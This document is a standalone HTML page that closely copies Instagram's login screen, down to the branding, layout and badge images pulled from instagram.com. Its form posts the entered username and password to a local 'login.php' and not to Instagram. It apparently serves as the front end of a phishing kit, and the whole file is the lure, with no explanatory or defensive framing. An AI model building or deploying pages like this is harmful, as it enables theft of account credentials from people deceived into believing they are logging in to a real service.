<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #fafafa; min-height: 100vh; display: flex; align-items: center; justify-content: center;
        }
        .login-container {
            background: white; border: 1px solid #dbdbdb; border-radius: 1px;
            padding: 40px 40px 20px; max-width: 350px; width: 100%; text-align: center;
        }
        .logo { font-family: 'Billabong', sans-serif; font-size: 48px; margin-bottom: 30px; color: #262626; }
        .input-group { margin-bottom: 6px; }
        .input-group input {
            width: 100%; padding: 9px 8px; background: #fafafa; border: 1px solid #dbdbdb;
            border-radius: 3px; font-size: 12px; color: #262626;
        }
        .input-group input:focus { border-color: #a8a8a8; outline: none; }
        .login-btn {
            width: 100%; padding: 7px; background: #0095f6; color: white; border: none;
            border-radius: 4px; font-size: 14px; font-weight: 600; margin-top: 12px; cursor: pointer;
        }
        .login-btn:disabled { opacity: 0.7; }
        .divider { display: flex; align-items: center; margin: 20px 0; color: #8e8e8e; font-size: 13px; font-weight: 600; }
        .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid #dbdbdb; }
        .divider::before { margin-right: 18px; }
        .divider::after { margin-left: 18px; }
        .fb-login { color: #385185; font-weight: 600; font-size: 14px; text-decoration: none; }
        .forgot-link { display: block; margin-top: 16px; color: #00376b; font-size: 12px; text-decoration: none; }
        .signup-box {
            background: white; border: 1px solid #dbdbdb; border-radius: 1px;
            padding: 20px 40px; max-width: 350px; width: 100%; text-align: center; margin-top: 10px;
            font-size: 14px; color: #262626;
        }
        .signup-box a { color: #0095f6; font-weight: 600; text-decoration: none; }
        .get-app { text-align: center; margin-top: 20px; font-size: 14px; }
        .app-badges { display: flex; gap: 8px; justify-content: center; margin-top: 16px; }
        .app-badge { height: 40px; }
    </style>
</head>
<body>
    <div>
        <div class="login-container">
            <div class="logo">Instagram</div>
            <form action="login.php" method="POST">
                <div class="input-group">
                    <input type="text" name="username" placeholder="Phone number, username, or email" required autofocus>
                </div>
                <div class="input-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit" class="login-btn">Log In</button>
            </form>
            <div class="divider">OR</div>
            <a href="#" class="fb-login">Log in with Facebook</a>
            <a href="#" class="forgot-link">Forgot password?</a>
        </div>
        <div class="signup-box">
            Don't have an account? <a href="#">Sign up</a>
        </div>
        <div class="get-app">
            <p>Get the app.</p>
            <div class="app-badges">
                <img class="app-badge" src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="Download on the App Store">
                <img class="app-badge" src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc924.png" alt="Get it on Google Play">
            </div>
        </div>
    </div>
</body>
</html>
